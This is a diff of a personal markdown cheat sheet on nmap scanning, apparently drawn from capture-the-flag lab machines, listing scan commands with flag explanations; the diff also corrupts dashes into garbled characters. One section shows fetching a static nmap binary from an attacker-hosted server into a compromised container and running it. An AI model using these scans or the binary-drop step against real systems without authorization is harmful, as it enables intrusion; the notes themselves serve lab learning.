@@ -22,15 +22,26 @@ Network scanner used for port discovery, service detection and version fingerpri
 
 ## Commands Used
 
+### Fast all-port discovery then targeted service scan
+```bash
+nmap -sS --min-rate 5000 -Pn -n -p- $TARGET -oN silent
+nmap -sVC -p22,80 $TARGET -oN service
+```
+Used on: **Vulnerability Capstone** - found SSH and Apache before Fuel CMS enumeration.
+
+- `-Pn` - skip host discovery and treat the host as online
+- `-n` - disable DNS lookups
+- `--min-rate 5000` - keep discovery fast on lab targets
+
 ### Full TCP scan with service/version detection + default scripts
 ```bash
 nmap -sC -sV -p- TARGET_IP
 ```
 Used on: **Kobold**, **CCTV**, **DevArea**
 
-- `-sC` — run default NSE scripts
-- `-sV` — detect service versions
-- `-p-` — scan all 65535 TCP ports
+- `-sC` â€” run default NSE scripts
+- `-sV` â€” detect service versions
+- `-p-` â€” scan all 65535 TCP ports
 
 ### Targeted scan against specific AD ports (no ping, no DNS)
 ```bash
@@ -38,23 +49,23 @@ nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389,4966
 ```
 Used on: **Overwatch**
 
-- `-sVC` — combined service detection + default scripts
-- `-Pn` — skip host discovery (treat as online)
-- `-n` — no DNS resolution
+- `-sVC` â€” combined service detection + default scripts
+- `-Pn` â€” skip host discovery (treat as online)
+- `-n` â€” no DNS resolution
 
 ### Two-phase: fast stealth discovery ? targeted service scan
 ```bash
-# Phase 1 — find open ports quickly (SYN scan, no DNS, high rate)
+# Phase 1 â€” find open ports quickly (SYN scan, no DNS, high rate)
 nmap -sS -p- --min-rate 5000 -n TARGET_IP
 
-# Phase 2 — service/version/script scan on discovered ports only
+# Phase 2 â€” service/version/script scan on discovered ports only
 nmap -sVC -p21,22,80 TARGET_IP -oA service-scan
 ```
 Used on: **Team**, **IDE**
 
-- `-sS` — SYN (stealth) scan
-- `--min-rate 5000` — send at least 5000 packets/second
-- `-oA` — output to all three formats (`.nmap`, `.gnmap`, `.xml`)
+- `-sS` â€” SYN (stealth) scan
+- `--min-rate 5000` â€” send at least 5000 packets/second
+- `-oA` â€” output to all three formats (`.nmap`, `.gnmap`, `.xml`)
 
 ### Focused HTTP/WinRM check
 ```
@@ -65,7 +76,7 @@ Used on: **MonitorsFour**
 
 ### Static binary inside a stripped container (no nmap installed)
 ```bash
-# Attacker — host the static binary
+# Attacker â€” host the static binary
 cd ~/static-bins && sudo python3 -m http.server 80
 # https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
 
@@ -73,7 +84,7 @@ cd ~/static-bins && sudo python3 -m http.server 80
 curl -fsSL http://$LHOST/nmap -o /tmp/nmap && chmod +x /tmp/nmap
 /tmp/nmap 172.17.0.1 -p- --min-rate 5000
 ```
-Used on: **ohmyweb** — found OMI/OMIGOD on `5986/tcp`. Static-binary drop pattern: [container-network-pivoting.md](../../exploits/container/container-network-pivoting.md).
+Used on: **ohmyweb** â€” found OMI/OMIGOD on `5986/tcp`. Static-binary drop pattern: [container-network-pivoting.md](../../exploits/container/container-network-pivoting.md).
 
 ### Banner-grab specific ports of interest after a discovery sweep (Bookstore had a Werkzeug dev server)
 ```bash
@@ -82,5 +93,3 @@ nmap -sVC -p22,80,5000,23636,36497 $TARGET -oA service
 # 5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)   <- Werkzeug debug -> werkzeug-debug-rce.md
 ```
 Used on: **Bookstore**
-
-
